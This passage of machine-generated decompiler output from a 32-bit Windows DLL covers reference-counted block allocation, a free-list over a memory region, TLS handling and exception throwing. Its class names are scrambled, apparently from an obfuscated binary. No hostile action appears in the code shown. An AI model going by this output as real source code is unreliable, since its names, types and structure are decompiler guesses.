{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1002473F((int)(this + 1));
  sub_1000DF1A(v1);
}

//----- (100246A3) --------------------------------------------------------
_DWORD *__thiscall sub_100246A3(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100744EC;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  sub_1000CBE0(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100744E4;
  return this;
}
// 100744E4: using guessed type int (__stdcall *off_100744E4)(char);

//----- (10024712) --------------------------------------------------------
_DWORD *__thiscall sub_10024712(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1002473F((int)this);
  sub_1000DF1A(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002473F) --------------------------------------------------------
int __stdcall sub_1002473F(int a1)
{
  return sub_1000CCDD(a1);
}

//----- (1002475F) --------------------------------------------------------
int __usercall sub_1002475F@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  char v2; // al
  int v4[9]; // [esp-14h] [ebp-64h] BYREF
  _DWORD v5[6]; // [esp+10h] [ebp-40h] BYREF
  int v6; // [esp+28h] [ebp-28h]
  _DWORD v7[8]; // [esp+2Ch] [ebp-24h] BYREF
  int v8; // [esp+4Ch] [ebp-4h]

  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)a1 + 8))(a1, a2[7], 0);
  a2[6] = a2[4];
  sub_1002FA43(v5, a1);
  v8 = 0;
  sub_1001B3FC(v7, (int)v5, 1);
  LOBYTE(v8) = 1;
  sub_1001B490(v7, *(unsigned __int8 *)a2);
  if ( *a2 == 12 )
  {
    sub_1001B4DB(v7, a2[4]);
    v2 = sub_1000C77C(a2 + 1, 0);
    sub_1001B4DB(v7, v2);
  }
  else
  {
    v7[4] = v4;
    sub_1000C3F3(a2 + 1, (int)v4);
    LOBYTE(v8) = 1;
    sub_1001B581(v7, v4[0], v4[1], v4[2], v4[3], v4[4]);
  }
  sub_1001B4DB(v7, v6);
  LOBYTE(v8) = 0;
  sub_1001B44E(v7);
  v8 = -1;
  return sub_1002FA9C(v5);
}
// 1002475F: using guessed type _DWORD var_40[6];

//----- (10024818) --------------------------------------------------------
int __thiscall sub_10024818(void *this, int a2)
{
  _DWORD *v2; // edi
  int v3; // eax
  bool v4; // zf
  int v6[5]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD pExceptionObject[5]; // [esp+24h] [ebp-18h] BYREF
  int v8; // [esp+38h] [ebp-4h]

  *(_DWORD *)a2 = this;
  sub_10024E40((int)this, (_DWORD *)(a2 + 16), 0);
  v8 = 0;
  v2 = *(_DWORD **)(a2 + 16);
  if ( *v2
    || (sub_1000C3F3(v2 + 1, (int)v6), LOBYTE(v8) = 1, v6[3] != 10)
    || (*(_DWORD *)(a2 + 8) = sub_1000C77C(v6, 2),
        *(_WORD *)(a2 + 4) = sub_1000C7D0(v6),
        v3 = sub_1000C77C(v6, 6),
        v4 = *(_WORD *)(a2 + 4) == 257,
        *(_DWORD *)(a2 + 12) = v3,
        !v4) )
  {
    sub_10024641(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  LOBYTE(v8) = 0;
  sub_1000C45D(v6);
  return a2;
}
// 10024818: using guessed type _DWORD pExceptionObject[5];

//----- (100248B3) --------------------------------------------------------
int __stdcall sub_100248B3(int a1, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v6[4]; // [esp-14h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-3Ch]
  int v8[5]; // [esp+10h] [ebp-28h] BYREF
  void *v9[4]; // [esp+24h] [ebp-14h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  *(_DWORD *)a1 = a2;
  *(_DWORD *)(a1 + 8) = a3;
  v7 = 0;
  *(_WORD *)(a1 + 4) = 257;
  *(_DWORD *)(a1 + 12) = a4;
  sub_1000DB0D((_DWORD *)(a1 + 16), v7);
  v10 = 0;
  sub_1000C28D((void *)0xA, (int)v8, 0);
  LOBYTE(v10) = 1;
  sub_1000C81E(v8);
  sub_1000C7EE(v8, *(_WORD *)(a1 + 4));
  sub_1000C79D(v8, 2, *(_DWORD *)(a1 + 8));
  sub_1000C79D(v8, 6, *(_DWORD *)(a1 + 12));
  sub_1000C3F3(v8, (int)v6);
  LOBYTE(v10) = 1;
  v4 = sub_10024DA6(a2, v9, 0, 0, v6[0], v6[1], v6[2], v6[3], v7);
  LOBYTE(v10) = 3;
  sub_1000DB7A(v4, a1 + 16);
  LOBYTE(v10) = 1;
  sub_1000DB4C(v9);
  LOBYTE(v10) = 0;
  sub_1000C45D(v8);
  return a1;
}
// 100248B3: using guessed type int var_28[5];

//----- (10024986) --------------------------------------------------------
LONG __userpurge sub_10024986@<eax>(int *a1@<edi>, int a2)
{
  int v3; // [esp-Ch] [ebp-40h]
  _DWORD *v4; // [esp-8h] [ebp-3Ch]
  volatile LONG *v5; // [esp-4h] [ebp-38h]
  int v6[7]; // [esp+14h] [ebp-20h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  a1[2] = a2;
  sub_1000C3F3((_DWORD *)(a1[4] + 4), (int)v6);
  v7 = 0;
  sub_1000C79D(v6, 2, a1[2]);
  sub_1000C439(v6, a1[4] + 4);
  v5 = (volatile LONG *)a1[5];
  v4 = (_DWORD *)a1[4];
  InterlockedIncrement(v5);
  LOBYTE(v7) = 1;
  v3 = *a1;
  LOBYTE(v7) = 0;
  sub_100252F8(v3, v4, (int)v5);
  v7 = -1;
  return sub_1000C45D(v6);
}
// 10024986: using guessed type int var_20[7];

//----- (10024A03) --------------------------------------------------------
_DWORD *__thiscall sub_10024A03(void *this, _DWORD *a2, unsigned int a3)
{
  *a2 = this;
  sub_10024E40((int)this, a2 + 2, a3);
  a2[1] = sub_1000C77C((_DWORD *)(a2[2] + 4), 0);
  return a2;
}

//----- (10024A41) --------------------------------------------------------
int *__stdcall sub_10024A41(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  int v7[4]; // [esp-14h] [ebp-50h] BYREF
  int v8; // [esp-4h] [ebp-40h]
  int v9[5]; // [esp+10h] [ebp-2Ch] BYREF
  void *v10[5]; // [esp+24h] [ebp-18h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  *a1 = a2;
  v8 = 0;
  a1[1] = a5;
  sub_1000DB0D(a1 + 2, v8);
  v11 = 0;
  sub_1000C28D((void *)(a4 - 9), (int)v9, 0);
  LOBYTE(v11) = 1;
  sub_1000C81E(v9);
  sub_1000C79D(v9, 0, a1[1]);
  sub_1000C3F3(v9, (int)v7);
  LOBYTE(v11) = 1;
  v5 = sub_10024DA6(a2, v10, 12, a3, v7[0], v7[1], v7[2], v7[3], v8);
  LOBYTE(v11) = 3;
  sub_1000DB7A(v5, (int)(a1 + 2));
  LOBYTE(v11) = 1;
  sub_1000DB4C(v10);
  LOBYTE(v11) = 0;
  sub_1000C45D(v9);
  return a1;
}
// 10024A41: using guessed type int var_2C[5];

//----- (10024AFE) --------------------------------------------------------
int __stdcall sub_10024AFE(int a1, int a2)
{
  _DWORD *v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  v7 = 0;
  *(_DWORD *)(a1 + 12) = a2;
  *(_DWORD *)a1 = &off_10074504;
  v2 = sub_10018A88(v5);
  LOBYTE(v7) = 1;
  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 12) + 36))(*(_DWORD *)(a1 + 12), v6);
  LOBYTE(v7) = 2;
  sub_10012F8B(a1 + 16, 17, v3, 1, *(LPSECURITY_ATTRIBUTES *)(*v2 + 4));
  LOBYTE(v7) = 4;
  sub_10009F65(v6);
  LOBYTE(v7) = 5;
  sub_10003D24(v5);
  sub_10009D2C((_DWORD *)(a1 + 32), &word_1008E84C);
  *(_DWORD *)(a1 + 40) = 0;
  return a1;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10074504: using guessed type int (__thiscall *off_10074504)(void *Block, char);
// 10024AFE: using guessed type _DWORD var_1C[2];
// 10024AFE: using guessed type int var_14[4];

//----- (10024B9B) --------------------------------------------------------
int *__thiscall sub_10024B9B(int *Block, char a2)
{
  sub_10024BBA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10024BBA) --------------------------------------------------------
BOOL __thiscall sub_10024BBA(int *this)
{
  BOOL result; // eax
  _DWORD v3[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v4; // [esp+28h] [ebp-4h]

  v3[2] = this;
  *this = (int)&off_10074504;
  v4 = 3;
  sub_10012C8B(this + 4, v3);
  LOBYTE(v4) = 4;
  (*(void (__thiscall **)(int))(*(_DWORD *)this[3] + 8))(this[3]);
  LOBYTE(v4) = 3;
  sub_10012CBF(v3);
  v4 = 1;
  sub_10009F65(this + 8);
  LOBYTE(v4) = 0;
  result = sub_100130B8((HANDLE *)this + 4);
  *this = (int)&off_10073904;
  return result;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10074504: using guessed type int (__thiscall *off_10074504)(void *Block, char);

//----- (10024C3A) --------------------------------------------------------
void __thiscall sub_10024C3A(void *this)
{
  char v1[28]; // [esp+4h] [ebp-28h] BYREF
  int v2; // [esp+28h] [ebp-4h]

  sub_10024818(this, (int)v1);
  v2 = -1;
  sub_10024C8C((int)v1);
}

//----- (10024C8C) --------------------------------------------------------
void __stdcall sub_10024C8C(int a1)
{
  sub_1000DB4C((void **)(a1 + 16));
}

//----- (10024CB0) --------------------------------------------------------
int __userpurge sub_10024CB0@<eax>(unsigned int a1@<ecx>, int a2@<ebx>, unsigned int a3)
{
  int v4; // edi
  unsigned int v5; // esi
  bool v6; // zf
  int v7; // eax
  char v9[24]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD v10[2]; // [esp+28h] [ebp-24h] BYREF
  int v11[2]; // [esp+30h] [ebp-1Ch] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-14h] BYREF
  int v13; // [esp+48h] [ebp-4h]

  sub_10012C8B((int *)a2, v10);
  v13 = 0;
  v4 = 26;
  if ( a1 < 0x1A )
  {
    sub_1000CB74(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__);
  }
  v5 = a1 - a1 % 0xD;
  if ( v5 > a3 )
  {
    sub_1000DEEF(&a3);
    _CxxThrowException(&a3, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a2 + 12) + 24))(*(_DWORD *)(a2 + 12)) == 0;
  v7 = **(_DWORD **)(a2 + 12);
  if ( v6 )
    (*(void (__cdecl **)(unsigned int))(v7 + 28))(v5);
  else
    (*(void (__cdecl **)(unsigned int))(v7 + 20))(v5);
  if ( v5 <= 0x1A )
    v4 = 0;
  sub_100248B3((int)v9, a2, v4, a3);
  LOBYTE(v13) = 1;
  if ( v4 )
  {
    sub_10024A41(v11, a2, v4, v5 - v4, 0);
    LOBYTE(v13) = 1;
    sub_10024D82((int)v11);
  }
  LOBYTE(v13) = 0;
  sub_10024C8C((int)v9);
  v13 = -1;
  return sub_10012CBF(v10);
}
// 10024CB0: using guessed type _DWORD var_24[2];
// 10024CB0: using guessed type _DWORD pExceptionObject[4];

//----- (10024D82) --------------------------------------------------------
void __stdcall sub_10024D82(int a1)
{
  sub_1000DB4C((void **)(a1 + 8));
}

//----- (10024DA6) --------------------------------------------------------
_DWORD *__stdcall sub_10024DA6(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v12; // [esp-8h] [ebp-2Ch]
  volatile LONG *v13; // [esp-4h] [ebp-28h]

  v9 = operator new(0x20u);
  if ( v9 )
    v10 = sub_100244AF(&a5, v9, a3);
  else
    v10 = 0;
  sub_1000DB0D(a2, (int)v10);
  *(_DWORD *)(*a2 + 28) = a4;
  v13 = (volatile LONG *)a2[1];
  v12 = (_DWORD *)*a2;
  InterlockedIncrement(v13);
  sub_100252F8(a1, v12, (int)v13);
  sub_1000C45D(&a5);
  return a2;
}

//----- (10024E40) --------------------------------------------------------
_DWORD *__thiscall sub_10024E40(int this, _DWORD *a2, unsigned int a3)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[2]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+18h] [ebp-18h]
  int pExceptionObject; // [esp+1Ch] [ebp-14h] BYREF
  void *Block; // [esp+20h] [ebp-10h]
  int v11; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  v8 = 0;
  sub_10012C8B((int *)this, v7);
  v11 = 1;
  if ( a3 >= (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 16))(*(_DWORD *)(this + 12)) )
  {
    sub_10024641(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  Block = operator new(0x20u);
  LOBYTE(v11) = 2;
  if ( Block )
  {
    v4 = (***(int (__thiscall ****)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
    v5 = sub_10024472(Block, v4, a3);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v11) = 1;
  sub_1000DB0D(a2, (int)v5);
  v8 = 1;
  LOBYTE(v11) = 0;
  sub_10012CBF(v7);
  return a2;
}
// 10024E40: using guessed type _DWORD var_20[2];

//----- (10024EF5) --------------------------------------------------------
void __userpurge sub_10024EF5(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6, int *a7)
{
  int v7; // edi
  int v8[4]; // [esp+10h] [ebp-30h] BYREF
  int v9[7]; // [esp+20h] [ebp-20h] BYREF
  int v10; // [esp+3Ch] [ebp-4h]

  v7 = a1;
  if ( a3 + a2 == a1 )
  {
    a5 += a2;
    v7 = a3;
  }
  sub_10024A41(v8, a4, v7, a5, a6);
  v10 = 0;
  if ( a3 )
  {
    if ( v7 != a3 )
    {
      sub_10024A41(v9, a4, a3, a2, v7);
      LOBYTE(v10) = 0;
      sub_10024D82((int)v9);
    }
  }
  else
  {
    sub_10024986(a7, v7);
  }
  v10 = -1;
  sub_10024D82((int)v8);
}
// 10024EF5: using guessed type int var_30[4];
// 10024EF5: using guessed type int var_20[7];

//----- (10024F6A) --------------------------------------------------------
void __fastcall sub_10024F6A(int a1, unsigned int a2, void *a3)
{
  unsigned int v5; // edi
  int v6; // [esp+14h] [ebp-40h]
  int v7; // [esp+18h] [ebp-3Ch]
  int v8; // [esp+1Ch] [ebp-38h] BYREF
  unsigned int v9; // [esp+20h] [ebp-34h]
  int v10; // [esp+24h] [ebp-30h]
  int v11[2]; // [esp+2Ch] [ebp-28h] BYREF
  unsigned int v12; // [esp+34h] [ebp-20h]
  int v13; // [esp+50h] [ebp-4h]

  sub_10024818(a3, (int)v11);
  v13 = 0;
  v5 = v12;
  v7 = 0;
  v6 = 0;
  if ( v12 )
  {
    while ( 1 )
    {
      sub_10024A03(a3, &v8, v5);
      LOBYTE(v13) = 1;
      if ( a2 < v5 )
        break;
      v7 = v5;
      v5 = v9;
      v6 = *(_DWORD *)(v10 + 24) + 9;
      LOBYTE(v13) = 0;
      sub_10024D82((int)&v8);
      if ( !v5 )
        goto LABEL_4;
    }
    if ( v5 == a2 + a1 )
    {
      v5 = v9;
      a1 += *(_DWORD *)(v10 + 24) + 9;
    }
    sub_10024EF5(a2, v6, v7, (int)a3, a1, v5, v11);
    LOBYTE(v13) = 0;
    sub_10024D82((int)&v8);
  }
  else
  {
LABEL_4:
    sub_10024EF5(a2, v6, v7, (int)a3, a1, v5, v11);
  }
  v13 = -1;
  sub_10024C8C((int)v11);
}

//----- (10025071) --------------------------------------------------------
unsigned int __fastcall sub_10025071(unsigned int a1, _DWORD **a2)
{
  unsigned int v4; // ebx
  unsigned int v5; // eax
  int v6; // esi
  int v8; // [esp-8h] [ebp-74h]
  int v9; // [esp+14h] [ebp-58h]
  int v10; // [esp+18h] [ebp-54h]
  int pExceptionObject[2]; // [esp+1Ch] [ebp-50h] BYREF
  int v12; // [esp+24h] [ebp-48h] BYREF
  unsigned int v13; // [esp+28h] [ebp-44h]
  int v14; // [esp+2Ch] [ebp-40h]
  int v15[4]; // [esp+34h] [ebp-38h] BYREF
  int v16[2]; // [esp+44h] [ebp-28h] BYREF
  unsigned int v17; // [esp+4Ch] [ebp-20h]
  unsigned int v18; // [esp+50h] [ebp-1Ch]
  int v19; // [esp+68h] [ebp-4h]

  sub_10024818(a2, (int)v16);
  v19 = 0;
  v4 = v17;
  v10 = 0;
  pExceptionObject[0] = 0;
  if ( v17 )
  {
    while ( 1 )
    {
      sub_10024A03(a2, &v12, v4);
      LOBYTE(v19) = 1;
      v5 = *(_DWORD *)(v14 + 24) + 9;
      v9 = v13;
      if ( v5 >= a1 )
        break;
      v10 = v4;
      pExceptionObject[0] = *(_DWORD *)(v14 + 24) + 9;
      v4 = v13;
      LOBYTE(v19) = 0;
      sub_10024D82((int)&v12);
      if ( !v4 )
        goto LABEL_4;
    }
    if ( v5 > a1 )
    {
      v8 = v5 - a1;
      v6 = v4 + a1;
      sub_10024A41(v15, (int)a2, v6, v8, v13);
      v9 = v6;
      LOBYTE(v19) = 1;
      sub_10024D82((int)v15);
    }
    if ( v10 )
    {
      sub_10024A41(v15, (int)a2, v10, pExceptionObject[0], v9);
      LOBYTE(v19) = 1;
      sub_10024D82((int)v15);
    }
    else
    {
      sub_10024986(v16, v9);
    }
    LOBYTE(v19) = 0;
    sub_10024D82((int)&v12);
  }
  else
  {
LABEL_4:
    v4 = (*(int (__thiscall **)(_DWORD *))(*a2[3] + 16))(a2[3]);
    if ( v4 + a1 > v18 )
    {
      sub_100251DA(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__);
    }
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*a2[3] + 20))(a2[3], v4 + a1);
  }
  v19 = -1;
  sub_10024C8C((int)v16);
  return v4;
}
// 10025071: using guessed type int var_38[4];

//----- (100251DA) --------------------------------------------------------
_DWORD *__stdcall sub_100251DA(_DWORD *a1)
{
  *a1 = &unk_100744FC;
  sub_1000DEEF(a1 + 1);
  sub_1000CB74(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_100744F4;
  return a1;
}
// 100744F4: using guessed type int (__stdcall *off_100744F4)(char);

//----- (1002522A) --------------------------------------------------------
void __thiscall sub_1002522A(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_100252D8((int)(this + 1));
  sub_1000DF1A(v1);
}

//----- (1002523C) --------------------------------------------------------
_DWORD *__thiscall sub_1002523C(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100744FC;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  sub_1000CBE0(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100744F4;
  return this;
}
// 100744F4: using guessed type int (__stdcall *off_100744F4)(char);

//----- (100252AB) --------------------------------------------------------
_DWORD *__thiscall sub_100252AB(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_100252D8((int)this);
  sub_1000DF1A(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (100252D8) --------------------------------------------------------
int __stdcall sub_100252D8(int a1)
{
  return sub_1000CCDD(a1);
}

//----- (100252F8) --------------------------------------------------------
void __stdcall sub_100252F8(int a1, _DWORD *a2, int a3)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 4))(*(_DWORD *)(a1 + 12));
  sub_1002475F(v3, a2);
  sub_1000DB4C((void **)&a2);
}

//----- (10025332) --------------------------------------------------------
void __userpurge sub_10025332(int *a1@<ebx>, _DWORD *a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  _DWORD *v6; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-2Ch]
  _DWORD v8[5]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  sub_10012C8B(a1, v8);
  LOBYTE(v9) = 1;
  v3 = a2;
  v4 = 13 * ((a2[6] + 21) / 0xDu);
  v5 = 13 * ((a2[4] + 21) / 0xDu);
  if ( v4 >= v5 )
  {
    if ( v4 > v5 )
      sub_10024F6A(v4 - v5, a2[7] + v5, a1);
  }
  else
  {
    sub_10024F6A(v4, a2[7], a1);
    v3[7] = sub_10025071(v5, (_DWORD **)a1);
  }
  v8[2] = &v6;
  v7 = lpAddend;
  v6 = v3;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 1;
  sub_100252F8((int)a1, v6, (int)v7);
  LOBYTE(v9) = 0;
  sub_10012CBF(v8);
  v9 = -1;
  sub_1000DB4C((void **)&a2);
}

//----- (100253E7) --------------------------------------------------------
int __stdcall sub_100253E7(int *a1, unsigned int a2)
{
  _DWORD v3[2]; // [esp+10h] [ebp-20h] BYREF
  void *v4[5]; // [esp+18h] [ebp-18h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_10012C8B(a1, v3);
  v5 = 0;
  sub_10024E40((int)a1, v4, a2);
  LOBYTE(v5) = 1;
  sub_10024F6A(13 * ((*((_DWORD *)v4[0] + 6) + 21) / 0xDu), *((_DWORD *)v4[0] + 7), a1);
  LOBYTE(v5) = 0;
  sub_1000DB4C(v4);
  v5 = -1;
  return sub_10012CBF(v3);
}
// 100253E7: using guessed type _DWORD var_20[2];

//----- (10025457) --------------------------------------------------------
void __stdcall sub_10025457(int *a1, _DWORD *a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  unsigned int v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v6; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-2Ch]
  _DWORD v8[5]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  sub_10012C8B(a1, v8);
  LOBYTE(v9) = 1;
  v3 = a2;
  v4 = sub_10025071(13 * ((a2[6] + 21) / 0xDu), (_DWORD **)a1);
  v5 = lpAddend;
  v3[7] = v4;
  v8[2] = &v6;
  v7 = v5;
  v6 = v3;
  InterlockedIncrement(v5);
  LOBYTE(v9) = 1;
  sub_100252F8((int)a1, v6, (int)v7);
  LOBYTE(v9) = 0;
  sub_10012CBF(v8);
  v9 = -1;
  sub_1000DB4C((void **)&a2);
}

//----- (100254DC) --------------------------------------------------------
int __thiscall sub_100254DC(int this)
{
  int result; // eax

  result = sub_10012B54((int *)(this + 16));
  if ( !*(_DWORD *)(this + 40) )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 24))(*(_DWORD *)(this + 12));
    if ( (_BYTE)result )
      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 8))(*(_DWORD *)(this + 12));
  }
  ++*(_DWORD *)(this + 40);
  return result;
}

//----- (10025535) --------------------------------------------------------
int __thiscall sub_10025535(int this)
{
  if ( (*(_DWORD *)(this + 40))-- == 1 )
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 8))(*(_DWORD *)(this + 12));
  return sub_10012B30(this + 16);
}

//----- (1002557E) --------------------------------------------------------
void *__stdcall sub_1002557E(int a1, void *a2)
{
  (*(void (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 12) + 36))(*(_DWORD *)(a1 + 12), a2);
  return a2;
}

//----- (100255BA) --------------------------------------------------------
_DWORD *__stdcall sub_100255BA(int a1, _DWORD *a2, int a3, int a4)
{
  unsigned int v4; // edi
  _DWORD *v5; // eax
  _DWORD v7[2]; // [esp+10h] [ebp-20h] BYREF
  void *v8; // [esp+18h] [ebp-18h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-14h]
  int v10; // [esp+20h] [ebp-10h]
  int v11; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  v11 = 1;
  sub_10012C8B((int *)a1, v7);
  LOBYTE(v11) = 2;
  v9 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 16))(*(_DWORD *)(a1 + 12));
  v4 = *(_DWORD *)(a3 + 28) + 13 * ((*(_DWORD *)(a3 + 24) + 21) / 0xDu);
  sub_1000DB0D(a2, 0);
  v10 = 1;
  if ( v4 < v9 )
  {
    v5 = sub_10024E40(a1, &v8, v4);
    LOBYTE(v11) = 3;
    sub_1000DB7A(v5, (int)a2);
    LOBYTE(v11) = 2;
    sub_1000DB4C(&v8);
  }
  LOBYTE(v11) = 1;
  sub_10012CBF(v7);
  LOBYTE(v11) = 0;
  sub_1000DB4C((void **)&a3);
  return a2;
}
// 100255BA: using guessed type _DWORD var_20[2];

//----- (10025663) --------------------------------------------------------
_DWORD *__stdcall sub_10025663(_DWORD *a1, int a2, int a3, LPSECURITY_ATTRIBUTES lpFileMappingAttributes)
{
  int v5[9]; // [esp+0h] [ebp-28h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v6 = 0;
  v5[6] = (int)v5;
  *a1 = off_10074514;
  sub_10009F32(v5, (int)&a2);
  LOBYTE(v6) = 0;
  sub_1002D15F((int)(a1 + 1), 4u, lpFileMappingAttributes, v5[0], v5[1]);
  v6 = -1;
  sub_10009F65(&a2);
  return a1;
}
// 10074514: using guessed type int (__thiscall *off_10074514[3])(void *Block, char);

//----- (100256B9) --------------------------------------------------------
_DWORD *__thiscall sub_100256B9(_DWORD *Block, char a2)
{
  sub_100256D8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100256D8) --------------------------------------------------------
bool __thiscall sub_100256D8(_DWORD *this)
{
  *this = off_10074514;
  return sub_1002D2C1(this + 1);
}
// 10074514: using guessed type int (__thiscall *off_10074514[3])(void *Block, char);

//----- (10025707) --------------------------------------------------------
_DWORD *__usercall sub_10025707@<eax>(_DWORD *a1@<esi>)
{
  DWORD v1; // eax

  *a1 = off_10074518;
  v1 = TlsAlloc();
  a1[1] = v1;
  if ( v1 == -1 )
    sub_100257C8();
  return a1;
}
// 100257C8: using guessed type void __noreturn sub_100257C8(void);
// 10074518: using guessed type int (__thiscall *off_10074518[2])(void *Block, char);

//----- (10025723) --------------------------------------------------------
_DWORD *__thiscall sub_10025723(_DWORD *Block, char a2)
{
  sub_10025779(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025779) --------------------------------------------------------
BOOL __thiscall sub_10025779(_DWORD *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  *this = off_10074518;
  pExceptionObject[6] = 0;
  result = TlsFree(this[1]);
  if ( !result )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10074518: using guessed type int (__thiscall *off_10074518[2])(void *Block, char);

//----- (100257C8) --------------------------------------------------------
void __noreturn sub_100257C8()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_1000E2E3(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 100257C8: using guessed type void __noreturn sub_100257C8();
// 100257C8: using guessed type _DWORD pExceptionObject[3];

//----- (10025818) --------------------------------------------------------
int sub_10025818()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( GetLastError() )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return 0;
}
// 10025818: using guessed type _DWORD pExceptionObject[3];

//----- (10025844) --------------------------------------------------------
void __noreturn sub_10025844()
{
  char pExceptionObject[12]; // [esp+0h] [ebp-10h] BYREF
  int v1; // [esp+Ch] [ebp-4h]

  v1 = 0;
  sub_1000E2E3(1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 1000E2E3: using guessed type _DWORD __stdcall sub_1000E2E3(_DWORD);
// 10025844: using guessed type void __noreturn sub_10025844();
// 10025844: using guessed type char pExceptionObject[12];

//----- (1002586E) --------------------------------------------------------
int __thiscall sub_1002586E(void *this, int a2, int a3)
{
  sub_1000C28D(*(void **)(a3 + 12), a2, 0);
